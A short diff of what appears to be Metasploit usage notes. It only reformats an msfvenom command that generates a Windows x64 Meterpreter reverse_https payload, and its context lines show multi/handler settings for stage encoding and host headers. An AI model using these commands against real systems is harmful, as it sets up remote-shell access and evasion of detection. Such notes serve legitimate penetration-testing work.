@@ -34,9 +34,11 @@ msf exploit(multi/handler) > set EnableStageEncoding true
 msf exploit(multi/handler) > set StageEncoder x64/zutto_dekiru
 ```
 
-`$ msfvenom -p windows/x64/meterpreter/reverse_https StagerURILength=420 HandlerSSLCert=/path/to/cert.pem`
+```
+$ msfvenom -p windows/x64/meterpreter/reverse_https StagerURILength=420 HandlerSSLCert=/path/to/cert.pem
+```
 
-* Optional payload advanced settings
+optional payload advanced settings
 
 ```
 msf exploit(multi/handler) > set HttpHostHeader
